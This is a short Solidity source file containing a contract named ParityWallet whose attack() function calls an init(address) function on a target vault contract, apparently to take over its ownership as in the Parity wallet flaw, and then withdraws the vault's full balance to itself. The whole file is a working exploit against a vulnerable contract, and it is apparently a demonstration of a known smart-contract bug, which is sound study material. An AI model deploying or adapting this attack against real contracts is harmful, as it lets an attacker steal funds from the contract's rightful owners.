// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.6.0;
import "./CryptoVault.sol";

contract ParityWallet {
    CryptoVault cVault;

    constructor(address payable _cVault) public {
        cVault = CryptoVault(_cVault);
    }

    function attack() public {
        uint b = cVault.getBalance();
        
        (bool success,) = address(cVault).call(abi.encodeWithSignature("init(address)", this));
        require(success,"delegatecall failed");

        cVault.withdraw(b);
    }
    
    receive() external payable {}

    function getBalance() public view returns(uint) {
        return address(this).balance;
    }

    function check() external view returns(uint) {
        return cVault.getBalance();
    }
}